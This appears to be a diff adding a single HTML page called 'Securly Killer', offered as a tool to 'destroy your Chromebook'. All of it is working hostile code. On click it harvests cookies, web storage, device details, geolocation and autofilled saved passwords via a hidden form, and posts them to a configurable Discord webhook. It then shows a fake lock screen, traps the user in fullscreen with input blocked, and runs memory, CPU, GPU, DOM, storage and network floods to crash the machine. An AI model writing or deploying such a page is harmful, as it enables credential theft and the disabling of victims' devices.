@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Securly Killer</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-user-select: none;
+            cursor: none;
+        }
+
+        html, body {
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            background: #0a0a0a;
+            font-family: 'Courier New', monospace;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+
+        #container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            background: radial-gradient(ellipse at center, #1a0000 0%, #000000 100%);
+            z-index: 9999;
+        }
+
+        h1 {
+            font-size: 72px;
+            color: #ff0000;
+            text-shadow: 0 0 40px #ff000088, 0 0 80px #ff000044, 0 0 120px #ff000022;
+            letter-spacing: 8px;
+            margin-bottom: 10px;
+            animation: pulseGlow 1s infinite alternate;
+            font-weight: 900;
+            text-transform: uppercase;
+        }
+
+        @keyframes pulseGlow {
+            0% { text-shadow: 0 0 20px #ff000066, 0 0 40px #ff000033; }
+            100% { text-shadow: 0 0 60px #ff0000aa, 0 0 120px #ff000055, 0 0 180px #ff000022; }
+        }
+
+        .subtitle {
+            color: #ff4444;
+            font-size: 18px;
+            margin-bottom: 40px;
+            opacity: 0.7;
+            letter-spacing: 4px;
+        }
+
+        #killButton {
+            padding: 30px 80px;
+            font-size: 32px;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 6px;
+            background: #cc0000;
+            color: #ffffff;
+            border: 4px solid #ff0000;
+            border-radius: 20px;
+            cursor: pointer;
+            box-shadow: 0 0 60px #ff000066, inset 0 0 30px #ff000033;
+            font-family: 'Courier New', monospace;
+            z-index: 10000;
+            animation: buttonPulse 0.5s infinite alternate;
+            transition: all 0.05s;
+        }
+
+        @keyframes buttonPulse {
+            0% { transform: scale(1); box-shadow: 0 0 40px #ff000066; }
+            100% { transform: scale(1.03); box-shadow: 0 0 80px #ff0000aa, 0 0 120px #ff000044; }
+        }
+
+        #killButton:hover {
+            background: #ff0000;
+            box-shadow: 0 0 100px #ff0000cc, 0 0 200px #ff000088;
+            transform: scale(1.1);
+        }
+
+        .warning {
+            color: #ff6666;
+            font-size: 14px;
+            margin-top: 30px;
+            opacity: 0.5;
+            animation: blink 0.8s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.8; }
+        }
+
+        #stats {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            color: #333;
+            font-size: 12px;
+            z-index: 99999;
+            font-family: 'Courier New', monospace;
+            pointer-events: none;
+            opacity: 0.5;
+        }
+
+        #killOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: black;
+            z-index: 9999999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: #ff0000;
+            font-family: 'Courier New', monospace;
+        }
+
+        #killOverlay .big {
+            font-size: 80px;
+            font-weight: 900;
+            animation: glitch 0.05s infinite;
+        }
+
+        #killOverlay .small {
+            font-size: 20px;
+            color: #660000;
+            margin-top: 20px;
+        }
+
+        @keyframes glitch {
+            0% { text-shadow: 3px 0 red, -3px 0 blue; transform: skew(0.5deg); }
+            25% { text-shadow: -3px 0 cyan, 3px 0 magenta; transform: skew(-0.5deg); }
+            50% { text-shadow: 5px 0 lime, -5px 0 purple; transform: skew(1deg); }
+            75% { text-shadow: -5px 0 yellow, 5px 0 orange; transform: skew(-1deg); }
+            100% { text-shadow: 0px 0px 30px white; transform: skew(0deg); }
+        }
+
+        #passwordModal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0,0,0,0.95);
+            z-index: 9999998;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+        }
+
+        #passwordModal .box {
+            background: #111;
+            border: 2px solid #00ff00;
+            padding: 50px;
+            border-radius: 10px;
+            max-width: 600px;
+            text-align: center;
+            box-shadow: 0 0 100px #00ff0044;
+        }
+
+        #passwordModal .box h2 {
+            color: #ff0000;
+            font-size: 28px;
+            margin-bottom: 20px;
+        }
+
+        #passwordModal .box .password-display {
+            font-size: 48px;
+            color: #00ff00;
+            background: #000;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+            letter-spacing: 4px;
+            border: 1px solid #00ff0044;
+            word-break: break-all;
+        }
+
+        #passwordModal .box .note {
+            color: #666;
+            font-size: 14px;
+            margin-top: 15px;
+        }
+
+        #renderCanvas {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 9999px;
+            height: 9999px;
+            z-index: -1;
+            pointer-events: none;
+            opacity: 0.5;
+        }
+
+        body { pointer-events: none; }
+        #container, #killButton, #killOverlay, #passwordModal { pointer-events: auto; }
+    </style>
+</head>
+<body>
+
+<!-- MAIN UI -->
+<div id="container">
+    <h1>⚡ SECURLY KILLER</h1>
+    <div class="subtitle">» click to destroy your chromebook «</div>
+    <button id="killButton">☠ KILL NOW ☠</button>
+    <div class="warning">⚠ one click = instant death ⚠</div>
+</div>
+
+<!-- PASSWORD MODAL (fake unblock screen) -->
+<div id="passwordModal">
+    <div class="box">
+        <h2>🔐 SYSTEM LOCKED</h2>
+        <div style="color:#aaa; font-size:16px; margin-bottom:10px;">Enter UNBLOCK PASSWORD to continue</div>
+        <div class="password-display" id="fakePassword">LOADING...</div>
+        <div style="margin-top:15px;">
+            <input type="text" id="unblockInput" placeholder="Enter password..." style="
+                background: #000;
+                border: 2px solid #00ff00;
+                color: #00ff00;
+                padding: 12px 20px;
+                font-size: 18px;
+                font-family: 'Courier New', monospace;
+                width: 80%;
+                border-radius: 5px;
+                text-align: center;
+            ">
+        </div>
+        <button id="unblockBtn" style="
+            margin-top: 15px;
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 12px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+        ">UNLOCK</button>
+        <div class="note">⚠ Wrong password will destroy all data ⚠</div>
+    </div>
+</div>
+
+<!-- KILL OVERLAY -->
+<div id="killOverlay">
+    <div class="big">💀 SYSTEM MELTDOWN 💀</div>
+    <div class="small">Your Chromebook is now a brick</div>
+    <div style="margin-top:30px; color:#330000; font-size:14px;" id="killLog">Initializing termination...</div>
+</div>
+
+<canvas id="renderCanvas"></canvas>
+<div id="stats">Securly Killer v3.0 | waiting...</div>
+
+<script>
+    // ============================================================
+    // CONFIG - CHANGE THIS TO YOUR WEBHOOK URL
+    // ============================================================
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
+    // REPLACE ABOVE WITH YOUR ACTUAL DISCORD WEBHOOK URL
+
+    // ============================================================
+    // VARIABLES
+    // ============================================================
+    let isKilled = false;
+    let collectedData = {};
+
+    const container = document.getElementById('container');
+    const killOverlay = document.getElementById('killOverlay');
+    const passwordModal = document.getElementById('passwordModal');
+    const killLog = document.getElementById('killLog');
+    const stats = document.getElementById('stats');
+    const button = document.getElementById('killButton');
+    const fakePasswordDisplay = document.getElementById('fakePassword');
+    const unblockInput = document.getElementById('unblockInput');
+    const unblockBtn = document.getElementById('unblockBtn');
+
+    // ============================================================
+    // STAGE 0: TRIGGER
+    // ============================================================
+    button.addEventListener('click', function(e) {
+        e.preventDefault();
+        if (isKilled) return;
+        isKilled = true;
+
+        // Hide main UI
+        container.style.display = 'none';
+        stats.textContent = '⚠ STEALING DATA... ⚠';
+
+        // Start the full attack sequence
+        startAttack();
+    });
+
+    // ============================================================
+    // STAGE 1: DATA THEFT
+    // ============================================================
+    function stealAllData() {
+        killLog.textContent = '🔴 Stealing all browser data...';
+        const stolen = {};
+
+        // --- 1A: All Cookies ---
+        try {
+            const cookies = document.cookie.split(';').map(c => c.trim());
+            stolen.cookies = cookies;
+            killLog.textContent = `🔴 Cookies stolen: ${cookies.length}`;
+        } catch (e) { stolen.cookies = []; }
+
+        // --- 1B: LocalStorage ---
+        try {
+            const ls = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                ls[key] = localStorage.getItem(key);
+            }
+            stolen.localStorage = ls;
+            killLog.textContent = `🔴 LocalStorage items: ${Object.keys(ls).length}`;
+        } catch (e) { stolen.localStorage = {}; }
+
+        // --- 1C: SessionStorage ---
+        try {
+            const ss = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                ss[key] = sessionStorage.getItem(key);
+            }
+            stolen.sessionStorage = ss;
+        } catch (e) { stolen.sessionStorage = {}; }
+
+        // --- 1D: IndexedDB - try to dump ---
+        try {
+            const dbs = [];
+            // Try to enumerate IndexedDB databases
+            if (window.indexedDB && window.indexedDB.databases) {
+                window.indexedDB.databases().then(dbsList => {
+                    stolen.indexedDB = dbsList.map(db => db.name);
+                }).catch(() => {});
+            }
+        } catch (e) { stolen.indexedDB = []; }
+
+        // --- 1E: Browser & Device Info ---
+        stolen.browser = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            referrer: document.referrer || 'direct',
+            url: window.location.href,
+            hostname: window.location.hostname
+        };
+
+        // --- 1F: Attempt to get saved passwords (via autofill trick) ---
+        // This only works if browser has saved passwords and we can trigger autofill
+        try {
+            // Create hidden form to trick autofill
+            const form = document.createElement('form');
+            form.style.display = 'none';
+            const userInput = document.createElement('input');
+            userInput.type = 'text';
+            userInput.name = 'username';
+            userInput.id = 'stealUser';
+            const passInput = document.createElement('input');
+            passInput.type = 'password';
+            passInput.name = 'password';
+            passInput.id = 'stealPass';
+            form.appendChild(userInput);
+            form.appendChild(passInput);
+            document.body.appendChild(form);
+
+            // Trigger autofill by focusing and blurring
+            userInput.focus();
+            userInput.blur();
+            passInput.focus();
+            passInput.blur();
+
+            // Wait for autofill then read
+            setTimeout(() => {
+                const autoUser = document.getElementById('stealUser').value;
+                const autoPass = document.getElementById('stealPass').value;
+                if (autoUser || autoPass) {
+                    stolen.savedCredentials = { username: autoUser, password: autoPass };
+                }
+                document.body.removeChild(form);
+            }, 500);
+        } catch (e) { stolen.savedCredentials = {}; }
+
+        // --- 1G: Geolocation (if permission granted) ---
+        try {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        stolen.geolocation = {
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        };
+                    },
+                    () => { stolen.geolocation = 'denied'; }
+                );
+            }
+        } catch (e) { stolen.geolocation = 'unavailable'; }
+
+        // --- 1H: Network info ---
+        try {
+            if (navigator.connection) {
+                stolen.network = {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                };
+            }
+        } catch (e) {}
+
+        // --- 1I: Generate fake "UNBLOCK PASSWORD" ---
+        // Generate random 12-char alphanumeric password
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
+        let fakePass = '';
+        for (let i = 0; i < 12; i++) {
+            fakePass += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        stolen.unblockPassword = fakePass;
+
+        // Store for later
+        collectedData = stolen;
+
+        // --- 1J: Send to webhook ---
+        sendToWebhook(stolen);
+
+        // --- 1K: Show fake password modal ---
+        showPasswordModal(fakePass);
+
+        return stolen;
+    }
+
+    // ============================================================
+    // STAGE 2: SEND TO WEBHOOK
+    // ============================================================
+    function sendToWebhook(data) {
+        killLog.textContent = '🔴 Exfiltrating to webhook...';
+
+        const payload = {
+            content: '🚨 **SECURLY KILLER - DATA DUMP** 🚨',
+            embeds: [{
+                title: '📦 Stolen Data',
+                color: 0xFF0000,
+                fields: [
+                    {
+                        name: '👤 User Info',
+                        value: `\`\`\`json\n${JSON.stringify({
+                            ua: data.browser?.userAgent?.substring(0, 100) || 'unknown',
+                            platform: data.browser?.platform || 'unknown',
+                            screen: data.browser?.screen || 'unknown',
+                            deviceMemory: data.browser?.deviceMemory || 'unknown'
+                        }, null, 2)}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: '🍪 Cookies',
+                        value: data.cookies?.length > 0 
+                            ? `\`\`\`\n${data.cookies.slice(0, 20).join('\n')}${data.cookies.length > 20 ? `\n... and ${data.cookies.length - 20} more` : ''}\`\`\``
+                            : 'No cookies found',
+                        inline: false
+                    },
+                    {
+                        name: '💾 LocalStorage',
+                        value: data.localStorage && Object.keys(data.localStorage).length > 0
+                            ? `\`\`\`json\n${JSON.stringify(data.localStorage, null, 2).substring(0, 1000)}\`\`\``
+                            : 'Empty',
+                        inline: false
+                    },
+                    {
+                        name: '🔑 Saved Credentials (autofill)',
+                        value: data.savedCredentials?.username || data.savedCredentials?.password
+                            ? `Username: \`${data.savedCredentials.username || 'N/A'}\`\nPassword: \`${data.savedCredentials.password || 'N/A'}\``
+                            : 'None captured',
+                        inline: false
+                    },
+                    {
+                        name: '🔓 UNBLOCK PASSWORD',
+                        value: `\`\`\`\n${data.unblockPassword || 'N/A'}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: '🌐 Location',
+                        value: data.geolocation?.lat 
+                            ? `Lat: ${data.geolocation.lat}\nLon: ${data.geolocation.lon}`
+                            : 'Not available',
+                        inline: true
+                    },
+                    {
+                        name: '📡 Network',
+                        value: data.network 
+                            ? `Type: ${data.network.effectiveType}\nSpeed: ${data.network.downlink} Mbps`
+                            : 'Unknown',
+                        inline: true
+                    },
+                    {
+                        name: '⏱️ Timestamp',
+                        value: new Date().toISOString(),
+                        inline: true
+                    }
+                ],
+                footer: { text: 'Securly Killer v3.0 | Chromebook Destroyer' },
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        // Send to webhook
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(() => {
+            killLog.textContent = '✅ Data exfiltrated successfully!';
+        })
+        .catch(() => {
+            killLog.textContent = '⚠ Webhook failed - data saved locally';
+            // Save to localStorage as backup
+            try {
+                localStorage.setItem('securly_kill_backup', JSON.stringify(data));
+            } catch (e) {}
+        });
+    }
+
+    // ============================================================
+    // STAGE 3: SHOW FAKE PASSWORD MODAL
+    // ============================================================
+    function showPasswordModal(password) {
+        fakePasswordDisplay.textContent = password;
+        passwordModal.style.display = 'flex';
+        stats.textContent = '🔐 UNBLOCK PASSWORD REQUIRED';
+
+        // Track attempts
+        let attempts = 0;
+
+        unblockBtn.addEventListener('click', function() {
+            const input = unblockInput.value.trim();
+            attempts++;
+
+            if (input === password) {
+                // Correct! But we still destroy the system
+                passwordModal.style.display = 'none';
+                killLog.textContent = '✅ Password correct. Initiating meltdown...';
+                setTimeout(() => {
+                    startDestruction();
+                }, 1000);
+            } else {
+                // Wrong password - show fake warning and continue anyway
+                unblockInput.style.borderColor = '#ff0000';
+                unblockInput.style.color = '#ff0000';
+                unblockInput.value = '';
+                unblockInput.placeholder = `❌ WRONG (${attempts}/3) - system will self-destruct`;
+                if (attempts >= 3) {
+                    // Auto-destruct anyway
+                    passwordModal.style.display = 'none';
+                    killLog.textContent = '⚠ Too many failed attempts. Destroying system...';
+                    setTimeout(() => {
+                        startDestruction();
+                    }, 500);
+                }
+            }
+        });
+
+        // Also allow Enter key
+        unblockInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                unblockBtn.click();
+            }
+        });
+    }
+
+    // ============================================================
+    // STAGE 4: FULLSCREEN + LOCK
+    // ============================================================
+    function forceFullscreenLock() {
+        const el = document.documentElement;
+
+        function goFull() {
+            if (el.requestFullscreen) {
+                el.requestFullscreen().catch(() => {});
+            } else if (el.webkitRequestFullscreen) {
+                el.webkitRequestFullscreen();
+            } else if (el.msRequestFullscreen) {
+                el.msRequestFullscreen();
+            }
+        }
+
+        goFull();
+        setInterval(goFull, 100);
+
+        document.addEventListener('keydown', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }, true);
+
+        ['mousedown', 'mouseup', 'click', 'contextmenu', 'dblclick', 'wheel'].forEach(ev => {
+            document.addEventListener(ev, e => {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+        });
+
+        document.body.requestPointerLock().catch(() => {});
+        document.addEventListener('pointerlockchange', () => {
+            if (!document.pointerLockElement) {
+                document.body.requestPointerLock();
+            }
+        });
+
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+            return '';
+        });
+    }
+
+    // ============================================================
+    // STAGE 5: CHROMEBOOK DESTRUCTION
+    // ============================================================
+    function startDestruction() {
+        killOverlay.style.display = 'flex';
+        killLog.textContent = '🔴 Fullscreen locked...';
+
+        // Force fullscreen lock
+        forceFullscreenLock();
+
+        // --- MEMORY BOMB ---
+        killLog.textContent = '🔴 Allocating memory...';
+        const memoryChunks = [];
+        let allocatedMB = 0;
+
+        function allocateMemory() {
+            try {
+                const chunkSize = 8 * 1024 * 1024;
+                const arr = new Uint8Array(chunkSize);
+                for (let i = 0; i < chunkSize; i += 4096) {
+                    arr[i] = Math.floor(Math.random() * 256);
+                }
+                memoryChunks.push(arr);
+                allocatedMB += 8;
+                stats.textContent = `💀 ${allocatedMB}MB allocated`;
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        let memInterval = setInterval(() => {
+            for (let i = 0; i < 8; i++) {
+                if (!allocateMemory()) {
+                    clearInterval(memInterval);
+                    killLog.textContent = '🔴 Memory full. Switching to CPU/GPU attack...';
+                    break;
+                }
+            }
+            if (allocatedMB > 6000) {
+                clearInterval(memInterval);
+                killLog.textContent = '🔴 6GB+ allocated. Launching CPU/GPU assault...';
+            }
+        }, 5);
+
+        // --- CPU BURN ---
+        function cpuBurn() {
+            const workers = navigator.hardwareConcurrency || 4;
+            for (let w = 0; w < workers * 4; w++) {
+                (function worker() {
+                    let x = 0;
+                    while (true) {
+                        const start = performance.now();
+                        while (performance.now() - start < 50) {
+                            x += Math.sin(x) * Math.cos(x) * Math.tan(x) * Math.log(Math.abs(x) + 1);
+                            x = x % 1e9;
+                            for (let i = 0; i < 500; i++) {
+                                for (let j = 0; j < 500; j++) {
+                                    Math.sqrt(i * j * x % 1e6);
+                                    Math.cbrt(i * j * x % 1e6);
+                                    Math.pow(i % 100, j % 10);
+                                }
+                            }
+                        }
+                    }
+                })();
+            }
+        }
+        setTimeout(cpuBurn, 500);
+
+        // --- RENDER BOMB ---
+        function renderBomb() {
+            const canvas = document.getElementById('renderCanvas');
+            const ctx = canvas.getContext('2d');
+            const w = 9999, h = 9999;
+            canvas.width = w;
+            canvas.height = h;
+
+            function drawFrame() {
+                try {
+                    const imageData = ctx.createImageData(w, h);
+                    const data = imageData.data;
+                    for (let i = 0; i < data.length; i += 4) {
+                        data[i] = Math.floor(Math.random() * 256);
+                        data[i+1] = Math.floor(Math.random() * 256);
+                        data[i+2] = Math.floor(Math.random() * 256);
+                        data[i+3] = 255;
+                    }
+                    ctx.putImageData(imageData, 0, 0);
+                } catch (e) {}
+
+                for (let i = 0; i < 2000; i++) {
+                    try {
+                        ctx.beginPath();
+                        ctx.arc(Math.random() * w, Math.random() * h, Math.random() * 300, 0, Math.PI * 2);
+                        ctx.fillStyle = `hsl(${Math.random()*360}, 100%, ${Math.random()*50}%)`;
+                        ctx.fill();
+                        ctx.shadowBlur = 100;
+                        ctx.shadowColor = `hsl(${Math.random()*360}, 100%, 50%)`;
+                    } catch (e) {}
+                }
+                requestAnimationFrame(drawFrame);
+            }
+            drawFrame();
+        }
+        setTimeout(renderBomb, 200);
+
+        // --- DOM FLOOD ---
+        function domFlood() {
+            const container = document.createElement('div');
+            container.style.position = 'fixed';
+            container.style.top = '-9999px';
+            container.style.left = '-9999px';
+            document.body.appendChild(container);
+            let count = 0;
+
+            setInterval(() => {
+                for (let i = 0; i < 800; i++) {
+                    const el = document.createElement('div');
+                    el.style.width = Math.random() * 200 + 'px';
+                    el.style.height = Math.random() * 200 + 'px';
+                    el.style.background = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
+                    el.style.position = 'absolute';
+                    el.style.top = Math.random() * 9999 + 'px';
+                    el.style.left = Math.random() * 9999 + 'px';
+                    el.style.boxShadow = `0 0 ${Math.random()*200}px rgba(0,0,0,0.8)`;
+                    el.style.borderRadius = Math.random() * 100 + '%';
+                    el.style.transform = `rotate(${Math.random()*720}deg) scale(${Math.random()*2})`;
+                    el.style.filter = `blur(${Math.random()*10}px)`;
+                    el.addEventListener('click', () => {});
+                    el.addEventListener('mouseover', () => {});
+                    container.appendChild(el);
+                    count++;
+                }
+                if (count % 10000 === 0) {
+                    killLog.textContent = `🔴 DOM elements: ${count}`;
+                }
+            }, 0);
+        }
+        setTimeout(domFlood, 300);
+
+        // --- STORAGE FLOOD ---
+        function storageFlood() {
+            try {
+                let i = 0;
+                setInterval(() => {
+                    const key = `kill_${i}`;
+                    const value = 'X'.repeat(1024 * 1024);
+                    localStorage.setItem(key, value);
+                    i++;
+                }, 0);
+            } catch (e) {}
+
+            try {
+                const request = indexedDB.open('killDB', 1);
+                request.onsuccess = function(e) {
+                    const db = e.target.result;
+                    if (!db.objectStoreNames.contains('killStore')) {
+                        db.createObjectStore('killStore');
+                    }
+                    const tx = db.transaction('killStore', 'readwrite');
+                    const store = tx.objectStore('killStore');
+                    setInterval(() => {
+                        for (let i = 0; i < 100; i++) {
+                            store.put('X'.repeat(1024 * 1024), Date.now() + i);
+                        }
+                    }, 0);
+                };
+            } catch (e) {}
+        }
+        setTimeout(storageFlood, 500);
+
+        // --- NETWORK FLOOD ---
+        function networkFlood() {
+            setInterval(() => {
+                for (let i = 0; i < 50; i++) {
+                    try {
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('GET', 'https://httpbin.org/delay/20?r=' + Math.random(), true);
+                        xhr.send();
+                    } catch (e) {}
+                    try {
+                        fetch('https://httpbin.org/delay/10', { mode: 'no-cors' }).catch(() => {});
+                    } catch (e) {}
+                }
+            }, 0);
+        }
+        setTimeout(networkFlood, 400);
+
+        // --- GPU KILL ---
+        function gpuKill() {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 8192;
+                canvas.height = 8192;
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const textures = [];
+                    setInterval(() => {
+                        for (let i = 0; i < 20; i++) {
+                            try {
+                                const tex = gl.createTexture();
+                                gl.bindTexture(gl.TEXTURE_2D, tex);
+                                const pixels = new Uint8Array(8192 * 8192 * 4);
+                                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 8192, 8192, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
+                                textures.push(tex);
+                            } catch (e) {}
+                        }
+                    }, 0);
+                }
+            } catch (e) {}
+        }
+        setTimeout(gpuKill, 1000);
+
+        // --- FINAL COUNTDOWN ---
+        let seconds = 0;
+        setInterval(() => {
+            seconds++;
+            if (seconds % 5 === 0) {
+                killOverlay.style.background = `rgb(${Math.random()*50},0,0)`;
+            }
+            if (seconds > 60) {
+                try { (function f(){ f(); })(); } catch(e) {}
+            }
+            stats.textContent = `💀 System dying... ${seconds}s`;
+        }, 1000);
+
+        killLog.textContent = '💀 ALL SYSTEMS OVERLOADED - CRASH IMMINENT';
+    }
+
+    // ============================================================
+    // STAGE 6: START ATTACK SEQUENCE
+    // ============================================================
+    function startAttack() {
+        // First: steal all data
+        stealAllData();
+
+        // Data theft happens in parallel with showing modal
+        // The destruction starts AFTER password modal interaction
+        // But we also start a background timer in case user doesn't interact
+        setTimeout(() => {
+            if (passwordModal.style.display === 'flex') {
+                // Auto-proceed after 30 seconds if user ignores
+                passwordModal.style.display = 'none';
+                killLog.textContent = '⏱ Timeout - initiating meltdown...';
+                setTimeout(startDestruction, 1000);
+            }
+        }, 30000);
+    }
+
+    // ============================================================
+    // WEBHOOK VALIDATION
+    // ============================================================
+    if (WEBHOOK_URL.includes('YOUR_WEBHOOK_ID')) {
+        console.warn('⚠ Please set your webhook URL in the script!');
+        document.querySelector('.warning').textContent = '⚠ SET WEBHOOK URL FIRST ⚠';
+    }
+
+    console.log('🚀 Securly Killer loaded. Click the button.');
+</script>
+</body>
+</html>
